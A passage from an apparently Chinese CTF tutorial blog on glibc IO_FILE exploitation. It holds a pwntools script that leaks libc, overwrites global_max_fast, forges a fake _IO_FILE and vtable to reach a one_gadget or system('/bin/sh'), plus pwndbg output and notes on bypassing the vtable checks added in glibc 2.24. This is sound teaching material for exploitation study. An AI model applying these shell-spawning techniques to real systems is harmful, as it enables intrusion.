class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aw</span>(<span class="hljs-params">addr0,addr1</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sea(<span class="hljs-string">&#x27;Please input your name&#x27;</span>,p64(addr0)+p64(addr1))<br>    sla(<span class="hljs-string">&#x27;1.admin&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[+]-----Leak the Libc-----[+]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x1400</span>) <span class="hljs-comment"># 1</span><br>dele(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment"># 0</span><br>ru(<span class="hljs-string">&#x27;your note is\n&#x27;</span>)<br>libc_leak = uu64(rc(<span class="hljs-number">6</span>))<br>libc_base = libc_leak - <span class="hljs-number">0x3c4b78</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>one_gadget = libc_base + <span class="hljs-number">0xf1247</span><br>lg(<span class="hljs-string">&#x27;one_gadget&#x27;</span>,one_gadget)<br>_IO_str_jumps = libc_base + <span class="hljs-number">0x3c37a0</span><br>sh_addr = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>system_addr = libc.sym.system<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[+]-----Global max fast-----[+]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pause()<br>aw(one_gadget,libc_base+<span class="hljs-number">0x3c67f8</span>-<span class="hljs-number">8</span>)<br>pause()<br><br>dele(<span class="hljs-number">1</span>)<br><br>fake_IO = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>)<br>fake_IO = fake_IO.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_IO += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>fake_IO += p64(<span class="hljs-number">0x6020B0</span> - <span class="hljs-number">0x18</span>)<br><br>add(<span class="hljs-number">0x1400</span>,fake_IO[<span class="hljs-number">0x10</span>:])<br>dele(<span class="hljs-number">1</span>)<br>pause()<br>sl(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h5 id="调试"><a class="header-anchor" href="#调试">¶</a>调试</h5><p><strong>首先看看 global_max_fast 这部分。</strong></p><p>在我们写 <code>admin</code> 之前：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/10xg &amp;global_max_fast<br><span class="hljs-number">0x7f6a347977f8</span> &lt;global_max_fast&gt;:       <span class="hljs-number">0x0000000000000080</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797808</span> &lt;root&gt;:  <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797818</span> &lt;old_realloc_hook&gt;:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797828</span> &lt;old_malloc_hook&gt;:       <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797838</span> &lt;added_atexit_handler&gt;:  <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>写 <code>admin</code> 之后：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/10xg &amp;global_max_fast<br><span class="hljs-number">0x7f6a347977f8</span> &lt;global_max_fast&gt;:       <span class="hljs-number">0x0000006e696d6461</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797808</span> &lt;root&gt;:  <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797818</span> &lt;old_realloc_hook&gt;:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797828</span> &lt;old_malloc_hook&gt;:       <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797838</span> &lt;added_atexit_handler&gt;:  <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/s <span class="hljs-number">0x7f6a347977f8</span><br><span class="hljs-number">0x7f6a347977f8</span> &lt;global_max_fast&gt;:       <span class="hljs-string">&quot;admin&quot;</span><br></code></pre></td></tr></table></figure><p>释放大堆块前：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; parseheap<br>addr                prev                size                 status              fd                bk    <br><span class="hljs-number">0x8b9000</span>            <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x420</span>                Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br><span class="hljs-number">0x8b9420</span>            <span class="hljs-number">0x420</span>               <span class="hljs-number">0x1410</span>               Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br>pwndbg&gt; x/xg &amp;_IO_list_all<br><span class="hljs-number">0x7f6a34796520</span> &lt;_IO_list_all&gt;:  <span class="hljs-number">0x00007f6a34796540</span><br>pwndbg&gt; x/xg <span class="hljs-number">0x00007f6a34796540</span><br><span class="hljs-number">0x7f6a34796540</span> &lt;_IO_2_1_stderr_&gt;:       <span class="hljs-number">0x00000000fbad2086</span><br></code></pre></td></tr></table></figure><p>释放大堆块后：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; parseheap<br>addr                prev                size                 status              fd                bk    <br><span class="hljs-number">0x8b9000</span>            <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x420</span>                Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br><span class="hljs-number">0x8b9420</span>            <span class="hljs-number">0x420</span>               <span class="hljs-number">0x1410</span>               Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br>pwndbg&gt; x/xg &amp;_IO_list_all<br><span class="hljs-number">0x7f6a34796520</span> &lt;_IO_list_all&gt;:  <span class="hljs-number">0x00000000008b9420</span><br></code></pre></td></tr></table></figure><p>可以看到我们的 _IO_list_all 成功的被我们堆地址取代了。从而我们控制了遍历 IO 结构体时的整个流程。</p><p>其中偏移计算（这里我重新运行了所以和上面地址不同但思路不影响）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p &amp;main_arena.fastbinsY<br>$<span class="hljs-number">5</span> = (mfastbinptr (*)[<span class="hljs-number">10</span>]) <span class="hljs-number">0x7f8a7d7b0b28</span> &lt;main_arena+<span class="hljs-number">8</span>&gt;<br>pwndbg&gt; p &amp;_IO_list_all<br>$<span class="hljs-number">6</span> = (struct _IO_FILE_plus **) <span class="hljs-number">0x7f8a7d7b1520</span> &lt;_IO_list_all&gt;<br>pwndbg&gt; p/x <span class="hljs-number">0x7f8a7d7b1520</span>-<span class="hljs-number">0x7f8a7d7b0b28</span><br>$<span class="hljs-number">7</span> = <span class="hljs-number">0x9f8</span><br>pwndbg&gt; p/x <span class="hljs-number">2</span>*<span class="hljs-number">0x9f8</span>+<span class="hljs-number">0x10</span><br>$<span class="hljs-number">8</span> = <span class="hljs-number">0x1400</span><br></code></pre></td></tr></table></figure><p><strong>再用 <code>fp</code> 看看我们伪造的 IO 结构体。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; parseheap<br>addr                prev                size                 status              fd                bk    <br><span class="hljs-number">0x8b9000</span>            <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x420</span>                Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br><span class="hljs-number">0x8b9420</span>            <span class="hljs-number">0x420</span>               <span class="hljs-number">0x1410</span>               Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br>pwndbg&gt; fp <span class="hljs-number">0x8b9420</span><br>$<span class="hljs-number">1</span> = &#123;<br>  file = &#123;<br>    _flags = <span class="hljs-number">1056</span>,<br>    _IO_read_ptr = <span class="hljs-number">0x1411</span> &lt;error: Cannot access memory at address <span class="hljs-number">0x1411</span>&gt;,<br>    _IO_read_end = <span class="hljs-number">0x7f6a34796540</span> &lt;_IO_2_1_stderr_&gt; <span class="hljs-string">&quot;\206 \255&quot;</span>, &lt;incomplete sequence \<span class="hljs-number">373</span>&gt;,<br>    _IO_read_base = <span class="hljs-number">0x0</span>,<br>    _IO_write_base = <span class="hljs-number">0x0</span>,<br>    _IO_write_ptr = <span class="hljs-number">0x1</span> &lt;error: Cannot access memory at address <span class="hljs-number">0x1</span>&gt;,<br>    _IO_write_end = <span class="hljs-number">0x0</span>,<br>    _IO_buf_base = <span class="hljs-number">0x0</span>,<br>    _IO_buf_end = <span class="hljs-number">0x0</span>,<br>    _IO_save_base = <span class="hljs-number">0x0</span>,<br>    _IO_backup_base = <span class="hljs-number">0x0</span>,<br>    _IO_save_end = <span class="hljs-number">0x0</span>,<br>    _markers = <span class="hljs-number">0x0</span>,<br>    _chain = <span class="hljs-number">0x0</span>,<br>    _fileno = <span class="hljs-number">0</span>,<br>    _flags2 = <span class="hljs-number">0</span>,<br>    _old_offset = <span class="hljs-number">0</span>,<br>    _cur_column = <span class="hljs-number">0</span>,<br>    _vtable_offset = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>    _shortbuf = <span class="hljs-string">&quot;&quot;</span>,<br>    _lock = <span class="hljs-number">0x0</span>,<br>    _offset = <span class="hljs-number">0</span>,<br>    _codecvt = <span class="hljs-number">0x0</span>,<br>    _wide_data = <span class="hljs-number">0x0</span>,<br>    _freeres_list = <span class="hljs-number">0x0</span>,<br>    _freeres_buf = <span class="hljs-number">0x0</span>,<br>    __pad5 = <span class="hljs-number">0</span>,<br>    _mode = -<span class="hljs-number">1</span>,<br>    _unused2 = <span class="hljs-string">&quot;\377\377\377\377&quot;</span>, <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats <span class="hljs-number">15</span> times&gt;<br>  &#125;,<br>  vtable = <span class="hljs-number">0x602098</span> &lt;completed&gt;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的重点是我们劫持的 vtable：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p *(const struct _IO_jump_t *)<span class="hljs-number">0x602098</span><br>$<span class="hljs-number">4</span> = &#123;<br>  __dummy = <span class="hljs-number">0</span>,<br>  __dummy2 = <span class="hljs-number">0</span>,<br>  __finish = <span class="hljs-number">0x0</span>,<br>  __overflow = <span class="hljs-number">0x7f6a344c2247</span> &lt;exec_comm+<span class="hljs-number">2263</span>&gt;,<br>  __underflow = <span class="hljs-number">0x0</span>,<br>  __uflow = <span class="hljs-number">0x0</span>,<br>  __pbackfail = <span class="hljs-number">0x0</span>,<br>  __xsputn = <span class="hljs-number">0x0</span>,<br>  __xsgetn = <span class="hljs-number">0x0</span>,<br>  __seekoff = <span class="hljs-number">0x8b9010</span>,<br>  __seekpos = <span class="hljs-number">0x0</span>,<br>  __setbuf = <span class="hljs-number">0x0</span>,<br>  __sync = <span class="hljs-number">0x0</span>,<br>  __doallocate = <span class="hljs-number">0x0</span>,<br>  __read = <span class="hljs-number">0x0</span>,<br>  __write = <span class="hljs-number">0x0</span>,<br>  __seek = <span class="hljs-number">0x0</span>,<br>  __close = <span class="hljs-number">0x0</span>,<br>  __stat = <span class="hljs-number">0x0</span>,<br>  __showmanyc = <span class="hljs-number">0x0</span>,<br>  __imbue = <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到 <code>__overflow</code> 位置已经被写上了我们的 onegadget 。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525000410526.png" alt="image-20220525000410526"></p><p>满足进入条件后，在 <code>_IO_cleanup</code> 的 <code>_IO_flush_all_lockp</code> 函数里面会调用结构体 vtable 的 <code>_IO_OVERFLOW</code> 函数，也就是我们提前替代好的 <code>one_gadget</code> 。</p><p><strong>进入 _IO_OVERFLOW 条件：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-number">779</span>       <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br>  <span class="hljs-number">780</span> <span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-number">781</span>     || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>  <span class="hljs-number">782</span>         &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>  <span class="hljs-number">783</span>                              &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>  <span class="hljs-number">784</span> <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-number">785</span>     )<br>► <span class="hljs-number">786</span>    &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br></code></pre></td></tr></table></figure><p>别看这都是 if 判断语句，这玩意遵循一个<strong>短路原则</strong>，就是如果已经有条件可以判断出 if 为假，就不会去执行剩下的判断语句。所以我们要成功的调用 <code>_IO_OVERFLOW</code> ，就要保证：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<br></code></pre></td></tr></table></figure><p>如果你想不开去保证另外一堆条件当然也是可以的。</p><p>调试部分到此就结束了。</p><p>此外，稍微提一句就是这题我们如果在 bss 段写的是 system 的话，结构体也可以这样构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_IO = <span class="hljs-string">&#x27;/bin/sh\0&#x27;</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>)<br>fake_IO = fake_IO.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_IO += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>fake_IO += p64(<span class="hljs-number">0x6020B0</span> - <span class="hljs-number">0x18</span>)<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525001739503.png" alt="image-20220525001739503"></p><p>这时候的 <strong>_IO_OVERFLOW</strong> 就等同于 <code>system('/bin/sh\0');</code> 能稳定 getshell。</p><h5 id="注意"><a class="header-anchor" href="#注意">¶</a>注意</h5><p>注意的点就是，我们 _IO_list_all 写的是堆地址，<strong>我们的 _flags 和 _IO_read_ptr 是被 prev_size 和 size 占据</strong>的。这就是为毛我们写的内容是 <code>fake_IO[0x10:]</code> 。</p><p>所以想要第二种方法 getshell 的话要记得更改上个 chunk 在 prev_size 位的数据。最后正常 getshell ：</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525122757746.png" alt="image-20220525122757746"></p><h3 id="基本构造"><a class="header-anchor" href="#基本构造">¶</a>基本构造</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">FILE</span>(<span class="hljs-params">vtable_addr</span>):<br>    fake_IO = <span class="hljs-string">&#x27;/bin/sh\0&#x27;</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>    fake_IO += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>)<span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br>    fake_IO = fake_IO.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>    fake_IO += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> <span class="hljs-comment"># _mode &lt;= 0</span><br>    fake_IO += p64(vtable_addr - <span class="hljs-number">0x18</span>)<br>    <span class="hljs-keyword">return</span> fake_IO<br></code></pre></td></tr></table></figure><hr><h2 id="2-24-Libc-2-27-3ubuntu1-2"><a class="header-anchor" href="#2-24-Libc-2-27-3ubuntu1-2">¶</a>2.24 =&lt; Libc &lt;= 2.27-3ubuntu1.2</h2><p>为毛是 2.27-3ubuntu1.2 是因为下面这俩 👴 在 2.27-3ubuntu1.4 试过了不行。</p><h3 id="vtable-检测绕过"><a class="header-anchor" href="#vtable-检测绕过">¶</a>vtable 检测绕过</h3><h4 id="没啥必要看的检查代码"><a class="header-anchor" href="#没啥必要看的检查代码">¶</a>没啥必要看的检查代码</h4><p>Libc 2.24 往上走就有了对 vtable 的检查。但基本思路还是没有变，劫持函数指针，只要掌握绕过思路本质还是一样的。</p><p>在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。</p><p>首先会验证 vtable 是否位于 <strong>_IO_vtable</strong> 段（段内一定偏移范围还是比较宽松的）中，如果满足条件就正常执行，否则会调用 *** _IO_vtable_check*** 做进一步合法性检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> _IO_vtable_check (<span class="hljs-type">void</span>) attribute_hidden;<br><br><span class="hljs-comment">/* Perform vtable pointer validation.  If validation fails, terminate</span><br><span class="hljs-comment">   the process.  */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *<br><span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span><br>&#123;<br>  <span class="hljs-comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span><br><span class="hljs-comment">     section.  */</span><br>  <span class="hljs-type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *ptr = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) vtable;<br>  <span class="hljs-type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length)) <span class="hljs-comment">//offset 大于 section_length , 调用检查函数</span><br>    <span class="hljs-comment">/* The vtable pointer is not in the expected section.  Use the</span><br><span class="hljs-comment">       slow path, which will terminate the process if necessary.  */</span><br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> attribute_hidden<br>_IO_vtable_check (<span class="hljs-type">void</span>)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br>  <span class="hljs-comment">/* Honor the compatibility flag.  */</span><br>  <span class="hljs-type">void</span> (*flag) (<span class="hljs-type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (flag);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">if</span> (flag == &amp;_IO_vtable_check)<span class="hljs-comment">//检查是否是外部重构的vtable</span><br>    <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-comment">/* In case this libc copy is in a non-default namespace, we always</span><br><span class="hljs-comment">     need to accept foreign vtables because there is always a</span><br><span class="hljs-comment">     possibility that FILE * objects are passed across the linking</span><br><span class="hljs-comment">     boundary.  */</span><br>  &#123;<br>    Dl_info di;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span>;</span><br>    <span class="hljs-keyword">if</span> (_dl_open_hook != <span class="hljs-literal">NULL</span><br>        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span><br>            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))<span class="hljs-comment">//检查是否是动态链接库中的vtable</span><br>      <span class="hljs-keyword">return</span>;<br>  &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span> <span class="hljs-comment">/* !SHARED */</span></span><br>  <span class="hljs-comment">/* We cannot perform vtable validation in the static dlopen case</span><br><span class="hljs-comment">     because FILE * handles might be passed back and forth across the</span><br><span class="hljs-comment">     boundary.  Therefore, we disable checking in this case.  */</span><br>  <span class="hljs-keyword">if</span> (__dlopen != <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  __libc_fatal (<span class="hljs-string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>上面这些没有用</strong>，主要眼熟一下这个，一般这个出来了说明你的 vtable 没 🐑 好，调试看看自己的数据有没有构造错。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">__libc_fatal (<span class="hljs-string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="经典俩大基本绕过思路"><a class="header-anchor" href="#经典俩大基本绕过思路">¶</a>经典俩大基本绕过思路</h4><p>因为加入了对 vtable 位置的检查，我们瞎几把劫持 vtable 的老一套已经没用了，但是基本利用思路还是盯着这个 <code>_IO_OVERFLOW</code> 。</p><p>不能写自己的 vtable ，那就找原本程序中就存在的 vtable，利用其中的函数指针。</p><p>目前主流思路就是利用 <code>_IO_str_jumps</code> 或 <code>_IO_wstr_jumps</code> 中的 <code>_IO_str_overflow()</code> 和 <code>_IO_str_finish()</code> 函数。</p><p>意思就是在 vtable 上写上 <code>_IO_str_jumps</code>  <strong>加减一段偏移</strong>来使得 IO 结构体在 <code>_IO_OVERFLOW</code> <strong>查 vtable 表时</strong>调用 <code>_IO_str_finish</code> 或 <code>_IO_str_overflow</code> 这类函数。</p><p>相比 2.23 ，最重要的就是<strong>对 <code>_flags</code> 比较严格</strong>，这里需要点篇幅看源码才能说明白。</p><h3 id="IO-str-jumps"><a class="header-anchor" href="#IO-str-jumps">¶</a>_IO_str_jumps</h3><p>就是一张 vtable 函数表。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_str_jumps</span> <span class="hljs-title">libio_vtable</span> =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_str_finish),<br>  JUMP_INIT(overflow, _IO_str_overflow),<br>  JUMP_INIT(underflow, _IO_str_underflow),<br>  JUMP_INIT(uflow, _IO_default_uflow),<br>  JUMP_INIT(pbackfail, _IO_str_pbackfail),<br>  JUMP_INIT(xsputn, _IO_default_xsputn),<br>  JUMP_INIT(xsgetn, _IO_default_xsgetn),<br>  JUMP_INIT(seekoff, _IO_str_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_default_setbuf),<br>  JUMP_INIT(sync, _IO_default_sync),<br>  JUMP_INIT(doallocate, _IO_default_doallocate),<br>  JUMP_INIT(read, _IO_default_read),<br>  JUMP_INIT(write, _IO_default_write),<br>  JUMP_INIT(seek, _IO_default_seek),<br>  JUMP_INIT(close, _IO_default_close),<br>  JUMP_INIT(stat, _IO_default_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="IO-str-finish"><a class="header-anchor" 